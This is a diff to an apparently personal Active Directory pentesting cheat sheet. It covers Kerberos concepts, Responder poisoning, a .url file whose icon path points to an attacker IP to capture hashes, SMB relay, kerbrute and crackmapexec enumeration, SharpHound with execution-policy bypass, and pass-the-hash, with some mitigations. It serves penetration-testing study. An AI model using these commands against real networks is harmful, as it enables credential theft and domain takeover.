@@ -107,40 +107,29 @@ Session Key - Issued by the KDC when a TGT is issued. The user will provide the 
 Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.
 
 AS-REQ w/ Pre-Authentication In Detail -
-
 The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.
 
 Ticket Granting Ticket Contents -
-
 In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.
 
 Service Ticket Contents -
-
 To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.
 
 Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
 User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.
 
 Kerberos Authentication Overview -
-
 AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
-
 AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
-
 TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
-
 TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
-
 AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
-
 AP-REP - 6.) The service grants access
 
 Kerberos Tickets Overview -
-
 The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.
 
 Attack Privilege Requirements -
-
 Kerbrute Enumeration - No domain access required 
 Pass the Ticket - Access as a user to the domain required
 Kerberoasting - Access as any user required
@@ -150,8 +139,7 @@ Silver Ticket - Service hash required
 Skeleton Key - Full domain compromise (domain admin) required
 
 Practical Portion starts here
-Attacking Actice Directory (Initial approach-meaning we only need to be on the same network as AD environment)
-
+Attacking Active Directory (Initial approach-meaning we only need to be on the same network as AD environment)
 summary
 
     start responder and mitm6 in the network
@@ -160,19 +148,16 @@ summary
     try default credentials in printers,web logins etc and try to gain access from there
 
 LLMNR/NBT-NS poisoning
-
-This attack happens when any user or computer request a resource or ip which the network dns fails to resolve(Meaning they either mistyped or requesting non existing resource).LLMNR is a Windows AD feature which tries to resolve request when DNS fails..We as an attacker can respond to the user using a tool called responder and act as a LLMNR server.LLMNR key flaw is that it requires user hash to work.We request users hash from the user and say we will resolve their request and this way we perform a mitm attack inside a AD network
+This attack happens when any user or computer request a resource or ip which the network dns fails to resolve(Meaning they either mistyped or requesting non existing resource). LLMNR is a Windows AD feature which tries to resolve request when DNS fails.  We as an attacker can respond to the user using a tool called responder and act as a LLMNR server. LLMNR key flaw is that it requires user hash to work. We request users hash from the user and say we will resolve their request and this way we perform a mitm attack inside a AD network
 
 NOte: This attack assumes we have network access same as the target
 
     Run responder
-
     responder -I interface(eth0,tun0 etc) -rdw
 
     Assume a user on the network tries to connect to a wrong smb share ,we will act as a llmnr server because dns fails and get the hash
 
     \shre
-
     we get the hash and now can crack it ,pass the hash etc
 
 Defense against LLMNR poisoning:
@@ -182,21 +167,18 @@ Defense against LLMNR poisoning:
     Set comnplex Password policy so captured hash cannot be cracked easily
 
 Url File Attacks (requires access to a domain machine and a writabele share)
-
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share
 
-In this attack we create a url file ,pointing towards our ip address and then upload this file to a writable share with a appropriate name starting with @ or - so that the file is on top when any user access that share.We run responder on our machine and then wait for any user to open the file and we can grab the hash just like we did before. This requires access to any domain machine
+In this attack we create a url file ,pointing towards our ip address and then upload this file to a writable share with a appropriate name starting with @ or - so that the file is on top when any user access that share. We run responder on our machine and then wait for any user to open the file and we can grab the hash just like we did before. This requires access to any domain machine
 
     create a file with following text and name it like "@anyname.url"
 
 [InternetShortcut] URL=blah WorkingDirectory=blah IconFile=\AttackerIP%USERNAME%.icon IconIndex=1
 
     Now we run responder and wait for the file to be opened
-
     responder -I eth0 -rdw
 
 SMB Relay attack
-
 In this attack we utilize llmnr poisoning and then use the captured hashes to dump sensitive critical information on other machines in the network.We utilize responder and ntlmrelay tool. Requirement for this is that smb signing must be disabled on target and the hash of the user which we captured,must be admin on the target machine.
 
     We need to narrow down all the targets which have smb signing disabled or enabled but are not required for logging in.
@@ -234,7 +216,6 @@ Mitigation:
     Limit local administrators across the network(a admin of single workstation is also admin of many other workstations which allows this attack)
 
 Gain authenticated access in domain
-
 We can use smbexec,wmiexec,psexec using the gained credentials for a semi interactive shell.Then we can find a way to gain a interactive shell or pipe a C2 Framework like empire for persistence or post exploitation.psexec is noisy and should be as a last resort
 
 NOTE: We can also use hashes instead of password
@@ -271,28 +252,22 @@ Enumerating AD users without wordlists using crackmapexec (RID bruteforce)
     crackmapexec smb $ip -u anonymous -p '' -d domain.name --rid-brute (anonymous login)
 
 we can also provide proper credentials for accurate info
-Enumerating AD users for kerberos attack (requires dc ip and wordlist)
 
+Enumerating AD users for kerberos attack (requires dc ip and wordlist)
 using tool called kerbrute
 
 To enumerate avalible users for kerberos authentication use command
-
 here dc is for domain controller and d is for domain. d is neccassary to specify
-
     ./kerbrute userenum --dc IPdomaincontroller -d CONTROLLER.local WordLists/ADusers.txt
 
 If we have credentials of the machine then we can enumerate users more accurately with impacket
-
     GetADUSers.py -all domain.name/USER:PASS@computername -dc-ip IPADDRESS
 
 Domain Info dump (Authenticated)
-
 we can get Entire users,froups,trusts info dumped if we have credentials for a domain user (does not need to be of higher privilege)
-
     ldapdomaindump $ip -u 'domain.name\username' -p password
 
 Post Compromise Enumeration
-
 Once we have gained access in a machine from the network
 
     Gather info using powerview
@@ -388,8 +363,8 @@ Find available shares
 
     Invoke-ShareFinder
 
-Bloodhound
 
+Bloodhound
 BloodHound is used to create a mapping of Active directory environment which allows us as an attacker to better understand the posture of target infrastructure. It maps trusts,permissions , groups users and make our further pentesting more deep.
 
 We will be using a powershell script used to receive information from target known as SharpHound which is part of Bloodhound project
@@ -406,7 +381,7 @@ I changed on my machine neo4j : hello
 
     powershell -ep bypass
 
-    Run SHarpHOund.ps1
+    Run SharpHound.ps1
 
     . .\SharpHound.ps1
 
@@ -427,8 +402,8 @@ I changed on my machine neo4j : hello
     We can view varius types of permissions etc
 
 Post Compromise attacks (either have a shell or have credentials in the network)
-
 Once we are in a network computer or have set of credentials from previous attacks we can proceed with post compromise
+
 Pass the hash/password
 
 In this attack we simply pass the credentials in entire network range to see in how many devices we can logon(Password reuse). We can either use the hashes (last portion of ntlm hash) or plaintext password and pass em around using crackmapexec
